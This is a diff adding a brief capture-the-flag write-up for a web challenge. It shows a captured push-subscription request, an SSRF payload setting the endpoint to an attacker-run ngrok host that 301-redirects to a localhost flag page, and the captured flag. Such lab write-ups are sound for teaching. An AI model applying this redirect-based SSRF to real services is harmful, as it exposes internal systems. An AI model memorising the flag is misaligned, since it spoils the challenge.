@@ -1,0 +1,46 @@
+When subscribe, the request is like
+```
+PUT /gerald/caa5322e-7f20-4526-9233-1a98d4955fa3/subscription HTTP/1.1
+Host: web.bcactf.com:49163
+Connection: close
+Content-Length: 365
+sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="90", "Google Chrome";v="90"
+sec-ch-ua-mobile: ?0
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
+Content-Type: application/json
+Accept: */*
+Origin: https://web.bcactf.com:49163
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://web.bcactf.com:49163/geralds
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: koa.sess=eyJwYXNzcG9ydCI6eyJ1c2VyIjoibGVvbGVvbGVvIn0sIl9leHBpcmUiOjE2MjM5NDMwODUwMjAsIl9tYXhBZ2UiOjg2NDAwMDAwfQ==; koa.sess.sig=fXhmyF4SvZJw-E2vYOxtCy02aRw
+
+{"endpoint":"https://fcm.googleapis.com/fcm/send/fvib8LTjnpE:APA91bGv1ZdMFxGZQfVio10oiXVyEXmh94tDoh_xwqELHeikRr7s4VK4CESnC6fqiSIg4NPAd-hXfsQTu_6Y1KHrLnfoKPYtxd5G32E5ck3ktafGkRvmFfe1x1ZDejKBFzGqYUnwWKd4","expirationTime":null,"keys":{"p256dh":"BMqn1M8d9nKDcKpAdAThSGwtvIvD7xkzUpUhoS4vo9Lnr24DJvyElPyqkBVtMfnTchA2DkpiudbiT1fLJhsoDNY","auth":"m1k1vRNPim0Lk7NMjpKicA"}}
+```
+
+SSRF
+
+npm install express
+npm install morgan
+
+Subscribe Flag Gerald
+
+Scbscribe Gerald with following endpoint payload
+```
+{"endpoint":"http://05879523e96f.ngrok.io",...}
+```
+
+Host the 301 redirect to Flag Gerald
+```
+node server.js
+```
+
+View Gerald => Notification to http://05879523e96f.ngrok.io => 301 Redirect to http://localhost:1337/gerald/07c95d99-c464-4f77-8df0-4f6c5dcd8c92 (Flag Gerald)
+
+The admin will visit Flag Gerald, set a break point on sw.js, and we can get the flag
+```
+bcactf{thanks_f0r_contributing_t0_th3_g3rard_lore_ssrf478fhgh}
+```
